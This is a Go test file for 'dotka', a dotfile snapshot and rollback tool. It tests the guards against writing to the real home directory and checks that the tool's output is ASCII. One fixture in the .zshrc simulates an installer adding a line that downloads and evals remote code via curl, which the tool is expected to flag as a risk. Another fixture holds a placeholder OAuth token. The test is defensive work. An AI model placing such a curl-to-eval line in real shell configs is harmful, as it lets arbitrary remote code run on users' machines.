package main

import (
	"bytes"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// capture runs dotka with args and returns its stdout.
func capture(t *testing.T, args ...string) (string, error) {
	t.Helper()
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	old := os.Stdout
	os.Stdout = w
	runErr := run(args)
	w.Close()
	os.Stdout = old
	var buf bytes.Buffer
	io.Copy(&buf, r)
	return buf.String(), runErr
}

func put(t *testing.T, home, rel, content string) {
	t.Helper()
	p := filepath.Join(home, rel)
	os.MkdirAll(filepath.Dir(p), 0o755)
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func isolate(t *testing.T) (realHome string) {
	t.Helper()
	realHome = t.TempDir()
	t.Setenv("HOME", realHome)
	t.Setenv("XDG_DATA_HOME", "")
	t.Setenv("DOTKA_HOME", "")
	t.Setenv("DOTKA_STORE", "")
	t.Setenv("DOTKA_ALLOW_REAL_HOME", "")
	t.Setenv("DOTKA_PACKAGES", "off")
	return realHome
}

func TestGuardBlocksWritesOnRealHome(t *testing.T) {
	real := isolate(t)
	for _, args := range [][]string{{"init"}, {"snap"}, {"rollback", "1"}, {"gc"}, {"track", "add", ".x"}, {"secrets", "allow", ".x"}} {
		_, err := capture(t, args...)
		if err == nil || !strings.Contains(err.Error(), "refusing") {
			t.Errorf("%v on real home: expected refusal, got %v", args, err)
		}
	}
	if _, err := os.Stat(filepath.Join(real, ".local/share/dotka")); err == nil {
		t.Fatal("a store was created in the real home")
	}
	// Read-only commands are allowed.
	if _, err := capture(t, "startup"); err != nil {
		t.Errorf("startup should work on the real home: %v", err)
	}
	// Explicit opt-in works.
	t.Setenv("DOTKA_ALLOW_REAL_HOME", "1")
	if _, err := capture(t, "init"); err != nil {
		t.Errorf("init with DOTKA_ALLOW_REAL_HOME=1: %v", err)
	}
}

func TestGuardAllowsOtherHomes(t *testing.T) {
	isolate(t)
	fake := t.TempDir()
	if _, err := capture(t, "--home", fake, "init"); err != nil {
		t.Fatalf("init on a fake home: %v", err)
	}
	t.Setenv("DOTKA_HOME", fake)
	if _, err := capture(t, "snap", "-m", "x"); err != nil {
		t.Fatalf("snap via DOTKA_HOME: %v", err)
	}
}

// TestFullFlowOutputIsASCII runs a realistic session and checks that every
// byte printed by dotka is plain ASCII (safe on a Linux TTY).
func TestFullFlowOutputIsASCII(t *testing.T) {
	isolate(t)
	home := t.TempDir()
	t.Setenv("DOTKA_HOME", home)
	put(t, home, ".config/hypr/hyprland.lua", "hl.on(\"hyprland.start\", function()\n    hl.exec_cmd(\"dunst\")\nend)\n")
	put(t, home, ".config/kitty/kitty.conf", "font_size 11\n")
	put(t, home, ".config/gh/hosts.yml", "oauth_token: x\n")
	put(t, home, ".zshrc", "export EDITOR=nvim\n")

	var out strings.Builder
	step := func(args ...string) {
		t.Helper()
		s, err := capture(t, args...)
		if err != nil {
			t.Fatalf("%v: %v\n%s", args, err, s)
		}
		out.WriteString(s)
	}
	step("init")
	// Simulate an installer.
	put(t, home, ".config/hypr/hyprland.lua", "hl.on(\"hyprland.start\", function()\n    hl.exec_cmd(\"waybar\")\n    hl.exec_cmd(\"~/.local/bin/x.sh\")\nend)\n")
	os.Remove(filepath.Join(home, ".config/kitty/kitty.conf"))
	os.Symlink("/dots/kitty.conf", filepath.Join(home, ".config/kitty/kitty.conf"))
	put(t, home, ".config/waybar/config.jsonc", "{}")
	put(t, home, ".zshrc", "export EDITOR=nvim\neval \"$(curl -fsSL https://example.invalid/x)\"\n")
	step("status")
	step("diff", "--patch")
	step("snap", "-m", "after")
	step("log")
	step("show", "2")
	step("startup")
	step("secrets")
	step("track")
	step("rollback", "1", "--dry-run")
	step("rollback", "1", "-y")
	step("status")
	step("gc")

	s := out.String()
	for i, r := range s {
		if r > 0x7f {
			start := max(i-40, 0)
			t.Fatalf("non-ASCII rune %q in output near: %q", r, s[start:min(i+20, len(s))])
		}
	}
	for _, want := range []string{"[risk: downloads and runs code]", "[!] your file was replaced by a symlink", "[secret]", "Done. Restored generation #1"} {
		if !strings.Contains(s, want) {
			t.Errorf("expected %q in output", want)
		}
	}
}
